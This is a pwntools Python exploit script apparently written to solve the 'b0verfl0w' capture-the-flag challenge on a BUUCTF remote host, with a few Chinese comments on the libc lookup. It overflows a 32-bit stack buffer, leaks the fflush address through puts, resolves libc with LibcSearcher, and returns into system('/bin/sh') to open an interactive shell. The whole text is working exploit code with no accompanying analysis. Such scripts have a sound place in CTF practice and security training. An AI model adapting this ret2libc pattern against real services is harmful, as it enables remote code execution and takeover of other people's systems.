from pwn import *

context(log_level='debug')

#io=process("./b0verfl0w")
io=remote("node3.buuoj.cn",25103)
elf=ELF("./b0verfl0w")

#libc=ELF("/lib/i386-linux-gnu/libc.so.6")

io.recv()

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
fflush_got=elf.got['fflush']

main=0x804850e

#pop_rdi_ret=0x400733

ret=0x804836a

payload=b'A'*(0x20+0x4)+p32(puts_plt)+p32(main)+p32(fflush_got)

io.sendline(payload)

io.recvuntil(b'\x2e')

fflush_addr=u32(io.recv(4))

print(hex(fflush_addr))

io.recv()
'''
base=fflush_addr-libc.symbols['fflush']
system=base+libc.symbols['system']

binsh=base+next(libc.search(b'/bin/sh'))

payload=b'A'*(0x20+0x4)+p32(system)+b'AAAA'+p32(binsh)

'''
from LibcSearcher import *  

libc = LibcSearcher('fflush',fflush_addr)  
#获取libc加载地址  
libc_base = fflush_addr - libc.dump('fflush')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  

payload=b'A'*(0x20+0x4)+p32(system_addr)+b'AAAA'+p32(binsh_addr)

io.sendline(payload)

io.interactive()